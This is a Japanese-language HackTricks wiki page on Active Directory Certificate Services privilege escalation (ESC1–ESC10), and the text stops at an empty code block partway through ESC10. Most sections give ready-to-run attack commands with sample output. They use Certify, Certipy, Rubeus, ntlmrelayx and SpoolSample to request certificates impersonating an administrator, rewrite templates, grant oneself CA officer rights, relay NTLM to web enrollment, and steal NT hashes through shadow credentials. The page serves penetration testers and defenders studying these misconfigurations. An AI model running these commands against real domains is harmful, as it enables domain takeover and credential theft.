# AD CS ドメイン昇格

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**これは、投稿の昇格技術セクションの要約です：**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 誤設定された証明書テンプレート - ESC1

### 説明

### 誤設定された証明書テンプレート - ESC1の説明

* **エンタープライズCAによって低特権ユーザーに登録権が付与されます。**
* **マネージャーの承認は必要ありません。**
* **承認された担当者の署名は必要ありません。**
* **証明書テンプレートのセキュリティ記述子は過度に許可的であり、低特権ユーザーが登録権を取得できるようにしています。**
* **証明書テンプレートは、認証を促進するEKUを定義するように構成されています：**
* クライアント認証（OID 1.3.6.1.5.5.7.3.2）、PKINITクライアント認証（1.3.6.1.5.2.3.4）、スマートカードログオン（OID 1.3.6.1.4.1.311.20.2.2）、任意の目的（OID 2.5.29.37.0）、またはEKUなし（SubCA）などの拡張キー使用（EKU）識別子が含まれています。
* **リクエスターが証明書署名要求（CSR）にsubjectAltNameを含めることができる能力がテンプレートによって許可されています：**
* Active Directory（AD）は、証明書に存在する場合、アイデンティティ検証のためにsubjectAltName（SAN）を優先します。これは、CSRでSANを指定することにより、任意のユーザー（例：ドメイン管理者）を偽装するための証明書をリクエストできることを意味します。リクエスターがSANを指定できるかどうかは、証明書テンプレートのADオブジェクト内の`mspki-certificate-name-flag`プロパティによって示されます。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが存在する場合、リクエスターによるSANの指定が許可されます。

{% hint style="danger" %}
この構成は、低特権ユーザーが任意のSANを持つ証明書をリクエストできることを許可し、KerberosまたはSChannelを介して任意のドメインプリンシパルとしての認証を可能にします。
{% endhint %}

この機能は、製品や展開サービスによるHTTPSまたはホスト証明書のオンザフライ生成をサポートするため、または理解不足のために有効にされることがあります。

このオプションで証明書を作成すると警告がトリガーされることが記載されていますが、既存の証明書テンプレート（`WebServer`テンプレートなど、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`が有効なもの）を複製してから認証OIDを含めるように変更した場合はそうではありません。

### 悪用

**脆弱な証明書テンプレートを見つけるには**、次のコマンドを実行できます：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
この脆弱性を**悪用して管理者を偽装する**には、次のコマンドを実行できます:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
次に、生成された**証明書を`.pfx`**形式に変換し、再度**Rubeusまたはcertipyを使用して認証**することができます:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windowsバイナリ「Certreq.exe」と「Certutil.exe」を使用してPFXを生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

ADフォレストの構成スキーマ内の証明書テンプレートの列挙、特に承認や署名を必要とせず、クライアント認証またはスマートカードログオンEKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効なものは、次のLDAPクエリを実行することで行うことができます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### 説明

第二の悪用シナリオは、最初のシナリオのバリエーションです：

1. エンタープライズCAによって、低特権ユーザーに登録権限が付与されます。
2. マネージャーの承認要件が無効化されます。
3. 認可された署名の必要性が省略されます。
4. 証明書テンプレートのセキュリティ記述子が過度に許可されており、低特権ユーザーに証明書登録権限を付与します。
5. **証明書テンプレートは、Any Purpose EKUまたはEKUなしとして定義されています。**

**Any Purpose EKU**は、攻撃者が**任意の目的**（クライアント認証、サーバー認証、コード署名など）で証明書を取得することを許可します。**ESC3に使用される技術**と同じ技術を使用して、このシナリオを悪用することができます。

**EKUなし**の証明書は、下位CA証明書として機能し、**任意の目的**で悪用される可能性があり、**新しい証明書に署名するためにも使用できます**。したがって、攻撃者は下位CA証明書を利用して、新しい証明書に任意のEKUやフィールドを指定することができます。

ただし、**ドメイン認証**のために作成された新しい証明書は、下位CAが**`NTAuthCertificates`**オブジェクトによって信頼されていない場合、機能しません。デフォルト設定ではそうなっています。それでも、攻撃者は**任意のEKU**と任意の証明書値を持つ**新しい証明書を作成する**ことができます。これらは、広範な目的（例：コード署名、サーバー認証など）で**悪用される可能性**があり、SAML、AD FS、またはIPSecなどのネットワーク内の他のアプリケーションに重大な影響を与える可能性があります。

ADフォレストの構成スキーマ内でこのシナリオに一致するテンプレートを列挙するには、次のLDAPクエリを実行できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 誤設定されたエンロールメントエージェントテンプレート - ESC3

### 説明

このシナリオは最初と二番目のものに似ていますが、**異なるEKU**（証明書リクエストエージェント）と**2つの異なるテンプレート**を**悪用**しています（したがって、2セットの要件があります）。

**証明書リクエストエージェントEKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoftの文書で**エンロールメントエージェント**として知られており、ある主体が**他のユーザーの代わりに**証明書に**エンロール**することを許可します。

**「エンロールメントエージェント」**はそのような**テンプレート**にエンロールし、結果として得られた**証明書を使用して他のユーザーの代わりにCSRに共同署名**します。その後、**共同署名されたCSR**をCAに**送信**し、「代わりにエンロールすることを許可する」**テンプレート**にエンロールし、CAは**「他の」ユーザーに属する証明書**で応答します。

**要件 1:**

* エンタープライズCAによって低特権ユーザーにエンロール権が付与されます。
* マネージャーの承認要件が省略されています。
* 認可された署名の要件はありません。
* 証明書テンプレートのセキュリティ記述子は過度に許可的であり、低特権ユーザーにエンロール権を付与しています。
* 証明書テンプレートには証明書リクエストエージェントEKUが含まれており、他の主体の代わりに他の証明書テンプレートをリクエストすることを可能にします。

**要件 2:**

* エンタープライズCAは低特権ユーザーにエンロール権を付与します。
* マネージャーの承認がバイパスされます。
* テンプレートのスキーマバージョンは1または2を超え、証明書リクエストエージェントEKUを必要とするアプリケーションポリシー発行要件を指定します。
* 証明書テンプレートで定義されたEKUはドメイン認証を許可します。
* CAに対してエンロールメントエージェントの制限は適用されません。

### 悪用

このシナリオを悪用するには、[**Certify**](https://github.com/GhostPack/Certify)または[**Certipy**](https://github.com/ly4k/Certipy)を使用できます。
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **ユーザー**が**取得**を許可されている**登録エージェント証明書**、登録**エージェント**が登録を許可されているテンプレート、および登録エージェントが行動できる**アカウント**は、エンタープライズCAによって制約されることがあります。これは、`certsrc.msc` **スナップイン**を開き、**CAを右クリック**し、**プロパティをクリック**し、次に「Enrollment Agents」タブに**移動**することで実現されます。

ただし、CAの**デフォルト**設定は「**登録エージェントを制限しない**」ことに注意が必要です。管理者によって登録エージェントの制限が有効にされ、「登録エージェントを制限する」に設定されても、デフォルトの構成は非常に許可的なままです。これにより、**Everyone**が誰でもすべてのテンプレートに登録することができます。

## 脆弱な証明書テンプレートアクセス制御 - ESC4

### **説明**

**証明書テンプレート**の**セキュリティ記述子**は、テンプレートに関する**ADプリンシパル**が持つ**権限**を定義します。

**攻撃者**が**テンプレート**を**変更**し、**前のセクション**で概説された**悪用可能な誤設定**を**導入**するために必要な**権限**を持っている場合、特権昇格が促進される可能性があります。

証明書テンプレートに適用される主な権限には以下が含まれます：

* **Owner:** オブジェクトに対する暗黙の制御を付与し、任意の属性を変更することを可能にします。
* **FullControl:** オブジェクトに対する完全な権限を付与し、任意の属性を変更する能力を含みます。
* **WriteOwner:** オブジェクトの所有者を攻撃者の制御下にあるプリンシパルに変更することを許可します。
* **WriteDacl:** アクセス制御の調整を可能にし、攻撃者にFullControlを付与する可能性があります。
* **WriteProperty:** 任意のオブジェクトプロパティの編集を許可します。

### 悪用

前の例のような特権昇格の例：

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対して書き込み権限を持っている場合です。これは、たとえば、証明書テンプレートの構成を上書きして、テンプレートをESC1に対して脆弱にするために悪用される可能性があります。

上記のパスで見ると、`JOHNPC`のみがこれらの権限を持っていますが、私たちのユーザー`JOHN`は`JOHNPC`への新しい`AddKeyCredentialLink`エッジを持っています。この技術は証明書に関連しているため、私はこの攻撃も実装しました。これは[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られています。ここでは、被害者のNTハッシュを取得するためのCertipyの`shadow auto`コマンドの小さなスニークピークを示します。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、単一のコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipyは設定を**上書き**して**ESC1に対して脆弱**にします。また、**`-save-old`パラメータを指定して古い設定を保存する**こともでき、これは攻撃後に設定を**復元**するのに役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### 説明

証明書テンプレートや証明書認証局を超えた複数のオブジェクトを含むACLベースの関係の広範なネットワークは、AD CSシステム全体のセキュリティに影響を与える可能性があります。これらのオブジェクトは、セキュリティに大きな影響を与える可能性があり、以下を含みます：

* CAサーバーのADコンピュータオブジェクトは、S4U2SelfやS4U2Proxyなどのメカニズムを通じて侵害される可能性があります。
* CAサーバーのRPC/DCOMサーバー。
* 特定のコンテナパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内の任意の子孫ADオブジェクトまたはコンテナ。このパスには、証明書テンプレートコンテナ、認証局コンテナ、NTAuthCertificatesオブジェクト、エンロールメントサービスコンテナなどのコンテナやオブジェクトが含まれますが、これに限定されません。

低特権の攻撃者がこれらの重要なコンポーネントのいずれかを制御できる場合、PKIシステムのセキュリティが侵害される可能性があります。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academyの投稿**](https://cqureacademy.com/blog/enhanced-key-usage)で議論されている主題は、Microsoftによって概説された**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグの影響にも触れています。この設定は、認証局（CA）で有効にされると、**ユーザー定義の値**を**任意のリクエスト**の**代替名**に含めることを許可します。これには、Active Directory®から構築されたリクエストも含まれます。したがって、この規定により、**侵入者**はドメイン**認証**のために設定された**任意のテンプレート**を通じて登録できるようになります。特に、標準のユーザーテンプレートのように**特権のない**ユーザー登録に開放されているものです。その結果、証明書が取得され、侵入者はドメイン管理者またはドメイン内の**他のアクティブなエンティティ**として認証できるようになります。

**注意**: 証明書署名要求（CSR）に**代替名**を追加する方法は、`certreq.exe`の`-attrib "SAN:"`引数を通じて行われ（「名前値ペア」と呼ばれる）、ESC1のSANの悪用戦略とは**対照的**です。ここでの違いは、**アカウント情報がどのようにカプセル化されるか**にあります—拡張ではなく、証明書属性内にあります。

### 悪用

設定が有効になっているかどうかを確認するために、組織は`certutil.exe`を使用して以下のコマンドを利用できます：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は本質的に**リモートレジストリアクセス**を利用するため、代替アプローチとしては次のようなものがあります：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
ツールのような [**Certify**](https://github.com/GhostPack/Certify) と [**Certipy**](https://github.com/ly4k/Certipy) は、この誤設定を検出し、悪用することができます：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていると仮定して、次のコマンドを任意のワークステーションから実行できます：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
この設定を環境で無効にするには、フラグを次のように削除できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
2022年5月のセキュリティ更新以降、新しく発行された**証明書**には、**リクエスターの `objectSid` プロパティ**を組み込んだ**セキュリティ拡張**が含まれます。ESC1の場合、このSIDは指定されたSANから派生します。しかし、**ESC6**の場合、SIDは**リクエスターの `objectSid`**を反映し、SANではありません。\
ESC6を悪用するには、システムがESC10（弱い証明書マッピング）に対して脆弱であることが重要であり、これにより**新しいセキュリティ拡張よりもSANが優先されます**。
{% endhint %}

## 脆弱な証明書認証局アクセス制御 - ESC7

### 攻撃 1

#### 説明

証明書認証局のアクセス制御は、CAのアクションを管理する一連の権限を通じて維持されます。これらの権限は、`certsrv.msc`にアクセスし、CAを右クリックしてプロパティを選択し、セキュリティタブに移動することで表示できます。さらに、PSPKIモジュールを使用して、次のようなコマンドで権限を列挙できます：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主な権限、すなわち **`ManageCA`** と **`ManageCertificates`** に関する洞察を提供し、それぞれ「CA管理者」と「証明書マネージャー」の役割に関連しています。

#### 悪用

証明書機関で **`ManageCA`** 権限を持つことは、PSPKIを使用して設定をリモートで操作することを可能にします。これには、ドメイン昇格の重要な側面である任意のテンプレートでSAN指定を許可するために **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを切り替えることが含まれます。

このプロセスの簡素化は、PSPKIの **Enable-PolicyModuleFlag** コマンドレットを使用することで達成可能で、直接的なGUI操作なしで変更を行うことができます。

**`ManageCertificates`** 権限を持つことで、保留中のリクエストの承認が可能になり、「CA証明書マネージャー承認」保護を効果的に回避できます。

**Certify** と **PSPKI** モジュールの組み合わせを使用して、証明書をリクエスト、承認、ダウンロードすることができます：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
前の攻撃では、**`Manage CA`** 権限を使用して **EDITF\_ATTRIBUTESUBJECTALTNAME2** フラグを有効にし、**ESC6攻撃**を実行しましたが、CAサービス（`CertSvc`）が再起動されるまで効果はありません。ユーザーが `Manage CA` アクセス権を持っている場合、そのユーザーは **サービスを再起動することも許可されます**。ただし、**ユーザーがリモートでサービスを再起動できることを意味するわけではありません**。さらに、ESC6は2022年5月のセキュリティ更新のため、ほとんどのパッチ適用環境では**そのままでは機能しない可能性があります**。
{% endhint %}

したがって、ここでは別の攻撃が提示されます。

前提条件：

* **`ManageCA` 権限のみ**
* **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
* 証明書テンプレート **`SubCA`** は **有効**でなければならない（**`ManageCA`** から有効にできる）

この手法は、`Manage CA` _かつ_ `Manage Certificates` アクセス権を持つユーザーが **失敗した証明書要求を発行できる**という事実に依存しています。**`SubCA`** 証明書テンプレートは **ESC1に対して脆弱ですが**、**管理者のみがテンプレートに登録できます**。したがって、**ユーザー**は **`SubCA`** への登録を **要求**できますが、これは **拒否され**、その後 **マネージャーによって発行されます**。

#### Abuse

自分自身に **`Manage Certificates`** アクセス権を付与するには、新しい担当者として自分のユーザーを追加できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して CA で **有効化** できます。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合、**`SubCA` テンプレートに基づいて証明書を要求することから始めることができます**。

**この要求は拒否されます**が、プライベートキーを保存し、要求IDをメモしておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
私たちの **`Manage CA` と `Manage Certificates`** を使用して、`ca` コマンドと `-issue-request <request ID>` パラメータを使って **失敗した証明書** リクエストを **発行** することができます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
そして最後に、`req`コマンドと`-retrieve <request ID>`パラメータを使用して**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

{% hint style="info" %}
**AD CSがインストールされている**環境では、**脆弱なウェブ登録エンドポイント**が存在し、少なくとも1つの**証明書テンプレートが公開されている**場合、**ドメインコンピュータの登録とクライアント認証を許可**する（デフォルトの**`Machine`**テンプレートなど）と、**スプーラーサービスがアクティブな任意のコンピュータが攻撃者によって侵害される可能性があります**!
{% endhint %}

AD CSは、管理者がインストールできる追加のサーバーロールを通じて利用可能な**HTTPベースの登録方法**をいくつかサポートしています。これらのHTTPベースの証明書登録インターフェースは、**NTLMリレー攻撃**に対して脆弱です。攻撃者は、**侵害されたマシンから、受信NTLMを介して認証される任意のADアカウントを偽装することができます**。被害者アカウントを偽装している間、これらのウェブインターフェースにアクセスすることで、攻撃者は**`User`または`Machine`証明書テンプレートを使用してクライアント認証証明書を要求することができます**。

* **ウェブ登録インターフェース**（`http://<caserver>/certsrv/`で利用可能な古いASPアプリケーション）は、デフォルトでHTTPのみを使用し、NTLMリレー攻撃に対する保護を提供しません。さらに、Authorization HTTPヘッダーを通じてNTLM認証のみを明示的に許可しており、Kerberosのようなより安全な認証方法は適用できません。
* **証明書登録サービス**（CES）、**証明書登録ポリシー**（CEP）Webサービス、および**ネットワークデバイス登録サービス**（NDES）は、デフォルトでAuthorization HTTPヘッダーを介してネゴシエート認証をサポートしています。ネゴシエート認証は**KerberosとNTLMの両方をサポート**しており、攻撃者はリレー攻撃中に**NTLMにダウングレード**することができます。これらのウェブサービスはデフォルトでHTTPSを有効にしていますが、HTTPSだけでは**NTLMリレー攻撃から保護されません**。HTTPSサービスのNTLMリレー攻撃からの保護は、HTTPSがチャネルバインディングと組み合わさった場合にのみ可能です。残念ながら、AD CSはIISでの認証のための拡張保護を有効にしておらず、チャネルバインディングに必要です。

NTLMリレー攻撃の一般的な**問題**は、**NTLMセッションの短い期間**と、攻撃者が**NTLM署名を必要とするサービス**と相互作用できないことです。

それにもかかわらず、この制限は、ユーザーのために証明書を取得するためにNTLMリレー攻撃を利用することで克服されます。証明書の有効期間がセッションの期間を決定し、証明書は**NTLM署名を義務付けるサービス**で使用できます。盗まれた証明書の利用方法については、以下を参照してください：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLMリレー攻撃のもう一つの制限は、**攻撃者が制御するマシンが被害者アカウントによって認証される必要がある**ことです。攻撃者はこの認証を待つか、**強制**しようとすることができます：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify)の`cas`は、**有効なHTTP AD CSエンドポイント**を列挙します：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ証明書認証局 (CA) によって証明書登録サービス (CES) エンドポイントを保存するために使用されます。これらのエンドポイントは、ツール **Certutil.exe** を利用して解析およびリスト化できます:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyの悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certipyによる証明書のリクエストは、アカウント名が`$`で終わるかどうかによって決定される`Machine`または`User`のテンプレートに基づいてデフォルトで行われます。代替テンプレートの指定は、`-template`パラメータを使用することで実現できます。

[PetitPotam](https://github.com/ly4k/PetitPotam)のような技術を使用して認証を強制することができます。ドメインコントローラーを扱う場合、`-template DomainController`の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は **`msPKI-Enrollment-Flag`** のためのもので、ESC9と呼ばれ、証明書に **新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張** を埋め込むことを防ぎます。このフラグは `StrongCertificateBindingEnforcement` が `1`（デフォルト設定）に設定されている場合に関連性を持ち、`2` の設定とは対照的です。ESC9がない場合、要件が変更されないため、KerberosやSchannelのための弱い証明書マッピングが悪用される可能性があるシナリオでは、その関連性が高まります（ESC10のように）。

このフラグの設定が重要になる条件は以下の通りです：

* `StrongCertificateBindingEnforcement` が `2` に調整されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
* 証明書が `msPKI-Enrollment-Flag` 設定内で `CT_FLAG_NO_SECURITY_EXTENSION` フラグでマークされている。
* 証明書によってクライアント認証 EKU が指定されている。
* 他のアカウントを妥協するために、任意のアカウントに対して `GenericWrite` 権限が利用可能である。

### 悪用シナリオ

`John@corp.local` が `Jane@corp.local` に対して `GenericWrite` 権限を持ち、`Administrator@corp.local` を妥協することを目指しているとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートは、その `msPKI-Enrollment-Flag` 設定に `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

最初に、`Jane` のハッシュは `John` の `GenericWrite` により、Shadow Credentials を使用して取得されます：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、意図的に`@corp.local`ドメイン部分が省略されます:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は制約に違反しません。`Administrator@corp.local`は`Administrator`の`userPrincipalName`として区別されます。

これに続いて、脆弱性があるとマークされた`ESC9`証明書テンプレートが`Jane`として要求されます：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` が `Administrator` を反映しており、「object SID」が欠如していることが記載されています。

`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試みると、`Administrator@corp.local`のNTハッシュが得られます。証明書にドメインの指定がないため、コマンドには`-domain <domain>`を含める必要があります：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱い証明書マッピング - ESC10

### 説明

ドメインコントローラー上の2つのレジストリキー値がESC10によって参照されています：

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`の下の`CertificateMappingMethods`のデフォルト値は`0x18`（`0x8 | 0x10`）で、以前は`0x1F`に設定されていました。
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`の下の`StrongCertificateBindingEnforcement`のデフォルト設定は`1`で、以前は`0`でした。

**ケース 1**

`StrongCertificateBindingEnforcement`が`0`に設定されている場合。

**ケース 2**

`CertificateMappingMethods`に`UPN`ビット（`0x4`）が含まれている場合。

### 悪用ケース 1

`StrongCertificateBindingEnforcement`が`0`に設定されている場合、`GenericWrite`権限を持つアカウントAは、任意のアカウントBを危険にさらすために悪用される可能性があります。

例えば、`Jane@corp.local`に対して`GenericWrite`権限を持つ攻撃者が、`Administrator@corp.local`を危険にさらそうとします。この手順はESC9と同様で、任意の証明書テンプレートを利用することができます。

最初に、`Jane`のハッシュがShadow Credentialsを使用して取得され、`GenericWrite`を悪用します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、制約違反を避けるために`@corp.local`部分が故意に省略されます。
```bash
